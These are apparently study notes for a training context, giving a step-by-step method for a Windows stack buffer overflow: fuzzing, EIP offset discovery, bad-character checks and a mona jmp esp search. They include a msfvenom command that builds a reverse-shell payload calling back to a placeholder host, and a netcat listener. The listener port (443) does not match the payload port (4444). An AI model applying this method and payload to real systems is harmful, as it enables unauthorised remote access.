# Buffer Overflow

## 1. Fuzz Overflow Length
  - send repeating buffer of greater and greater length until there the program crashes.
## 2. Identify EIP Location
  - use `msf-pattern_create -l <length>` to generate a payload
  - crash program with buffer attached and check values in EIP at crash
  - use `msf-pattern_offset -l <length> -q <4 byte EIP value>` to pinpoint offset EIP is landing at
## 3. Confirm EIP Control
  - use offset value from previous step to replace EIP offset with 4 B's and confirm by crashing the program again and seeing `42424242` in the EIP address value
## 3a. Test Overflow Condition
  - for registers that point to some location within the buffer, see how long you can push the payload size and not change the crash condition.
## 4. Identify Bad Characters
  - generate all bad characters and send to the program and make it crash.
  - manually inspect the memory values in order until you find a bad character.
  - take note of it, remove it from the payload and send the buffer until no characters are corrupted.
#### Generate Bad Chars
```py
from __future__ import print_function

for x in range(1, 256):
    print("\\x" + "{:02x}".format(x), end='')

print()
```
## 5. Find Op Code
  - ensure that opcode address does not have any of the bad characters in it
    !mona jmp -r esp -cpb "<list-of-bad-chars>"
  - opcode searcher
## 5. Generate Payload with msfvenom
```
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f py
```
## 6. Exploit
  - put it all together and catch the reverse shell with a netcat listener
  ```
  nc -nlvp 443
  ```
